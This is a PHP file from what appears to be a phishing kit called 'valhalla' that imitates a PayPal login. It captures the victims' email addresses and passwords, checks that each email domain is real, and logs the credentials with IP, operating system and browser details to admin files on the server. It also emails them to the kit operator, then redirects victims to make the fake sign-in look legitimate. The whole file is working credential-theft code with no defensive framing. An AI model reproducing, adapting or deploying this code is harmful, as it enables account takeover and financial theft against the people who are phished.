<?php
	
	/*ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
	error_reporting(E_ALL);*/

	session_start();
	include("../system.php");

	$email = $_SESSION["email"] = $_POST["login_email"];
	$_SESSION["password"] = $_POST["login_password"];


	function validate_email($email){
	// Check regular expression intelligence here: https://github.com/php/php-src/blob/master/ext/filter/logical_filters.c

	  	// Regular expression for a valid email address.
	  	$regexp = "/^(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){255,})(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){65,}@)(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22))(?:\\.(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22)))*@(?:(?:(?!.*[^.]{64,})(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\.){1,126}){1,}(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\[(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})|(?:(?!(?:.*[a-f0-9][:\\]]){7,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?)))|(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){5}:)|(?:(?!(?:.*[a-f0-9]:){5,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3}:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))(?:\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))){3}))\\]))$/iD";

	  	// Check if the email address is not valid syntactically.
	  	if (!preg_match ($regexp, $email)) return false;

	  	// Extract the user and the domain of the email.
	  	list ($user, $domain) = explode ("@", $email);

	  	// Check if the domain of the email does not exist.
	  	if (!checkdnsrr ($domain, 'MX'))
	    	return false;

	  	// In any other case the email is valid.
	  	return true;
	}

	$random=rand(0,100000000000);
	$errorrand=md5($random);
	if((isset($_POST['login_email'])) && (strlen($_POST['login_password']) >= 8)) {
		if(validate_email($email)){
			$valhallaletter = '
				<!DOCTYPE html>
				<html>
				<head><style type="text/css">*{padding: 0;margin: 0;box-sizing: border-box;}</style>
				</head>
				<body>
					<div style="height:100%;min-height: 100vh;width:100%;background-color: #009cde;background-image: radial-gradient(circle farthest-side at center bottom,#009cde,#003087 125%);padding: 25px 0">
						<div style="margin: 0 auto;width:600px;border:2px solid white;padding: 20px;">

							<div><img src="https://i.imgur.com/4LQAiAh.jpg" style="height: 50px;margin:0 auto;display: block;"></div>

							<h1 style="color: #fff;text-align: center;padding: 20px 0;font-family: arial;">NEW PPL LOGIN</h1>
							<div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">EMAIL ADDRESS :</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #022652">
										'. $_SESSION["email"] .'
									</h2>
								</div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">PASSWORD :</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #022652">
										'. $_SESSION["password"] .'
									</h2>
								</div>
							</div>
							<h1 style="color: #fff;text-align: center;padding: 0 0 20px 0;font-family: arial;">USER AGENT</h1>
							<div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">DATE & TIME :</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #022652">
										'. $date .'
									</h2>
								</div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">IP ADDRESS :</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;">
										<a style="color: #022652" target="_blank" href="https://whatismyipaddress.com/ip/'. $ip .'">'. $ip .'</a>
									</h2>
								</div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">SYSTEM :	</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #022652">
										'. $user_os .'
									</h2>
								</div>
								<div style="margin-bottom: 20px;">
									<span style="color: #fff;font-weight: bold;font-family: arial;margin-bottom: 5px;display: block;">BROWSER :	</span>
									<h2 style="background-color: #fff;font-family: arial;display: inline-block;padding: 5px 10px;color: #022652">
										'. $user_browser .'
									</h2>
								</div>
							</div>

						</div>
					</div>
				</body>
				</html>';

			$valhallalettre .= "<a style='display:block;font-size:22px;font-weight:bold;margin-bottom:10px;text-decoration:none;font-family:arial' href='".$_SERVER['REMOTE_ADDR'].".html"."' target='_blank'>".$_SERVER['REMOTE_ADDR']."</a>";

			$f = fopen("../../../admin/data.php", "a");
			fwrite($f, $valhallalettre);

			$file = fopen("../../../admin/".$ip.".html", "a");
			fwrite($file, $valhallaletter);
	
			header("Location: ../../app");
		}

		else {
		    header("Location: ../../app/signin.php?country.x=".$_SESSION['countrycode1']."&flowContext=login&flowId=ul&locale.x=".$_SESSION['countrycode1']."_".$_SESSION['country1']."&returnUri=%2Fauth%2Freturn&stepupContext=".$errorrand);
		}
	} else {
		header("Location: ../../app/signin.php?country.x=".$_SESSION['countrycode1']."&flowContext=login&flowId=ul&locale.x=".$_SESSION['countrycode1']."_".$_SESSION['country1']."&returnUri=%2Fauth%2Freturn&stepupContext=".$errorrand);
	}


	include("../../../e-mail.php");

	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$subject  = "valhalla 🤵 LOGIN 🤵 valhalla";
	$headers .= "From: user@valhalla.net" . "\r\n";
	mail($valhallato, $subject, $valhallaletter, $headers);

		